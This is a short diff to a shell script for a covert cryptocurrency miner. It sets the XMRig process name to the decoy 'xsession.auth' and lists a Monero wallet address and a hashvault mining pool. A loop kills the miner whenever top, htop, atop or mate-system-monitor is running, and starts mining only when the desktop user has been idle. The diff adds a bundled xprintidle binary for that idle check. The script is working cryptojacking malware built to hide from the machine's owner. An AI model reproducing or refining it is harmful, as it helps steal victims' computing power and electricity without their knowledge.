@@ -2,6 +2,7 @@
 
 # Settings
 XMRIGNAME=xsession.auth
+XPRINTIDLE_NAME=xprintidle
 WALLET=41gaYmwQbHV9DHEhfqE9YGMnYXc8fXov63MfHrJwSETL3RJsuYaMg8f6sTAkNxvjSiGuw1qCfYFE515ogxU171wYH5RnkJJ
 LOCAL_PATH=$HOME/.local/bin
 POOL=pool.hashvault.pro:80
@@ -35,14 +36,14 @@ main() {
 
 	while true; do 
 		sleep 1
-		
+
 		if pgrep "top" || pgrep "htop" || pgrep "atop" || pgrep "mate-system-mon"; then
 			pkill $XMRIGNAME
 			continue
 		fi
 
 		if [[ isUI -eq 1 ]]; then
-			idle=$(xprintidle)
+			idle=$($LOCAL_PATH/$XPRINTIDLE_NAME)
 			echo "UI, idle for $idle"
 			if [[ idle -gt $INACTIVITY_IN_MSEC ]]; then
 				run_xmr
